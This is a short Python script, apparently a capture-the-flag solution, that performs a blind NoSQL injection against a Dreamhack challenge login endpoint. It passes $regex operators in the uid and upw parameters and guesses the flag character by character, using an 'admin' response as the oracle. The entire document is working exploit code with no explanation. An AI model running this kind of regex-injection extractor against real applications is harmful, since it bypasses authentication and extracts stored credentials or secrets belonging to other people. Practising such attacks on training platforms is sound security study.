import requests, string


host = 'http://host1.dreamhack.games:15618'
message = 'admin'
string_list = string.digits + string.ascii_letters
flag =''

for i in range(32):
    for j in string_list:
        query = f'/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{j}'
        response = requests.get(host+query)
        if response.text == message:
            flag += j
            print(f"FLAG: DH{{{flag}}}")
            break
    

print(f'FLAG: DH{{{flag}}}')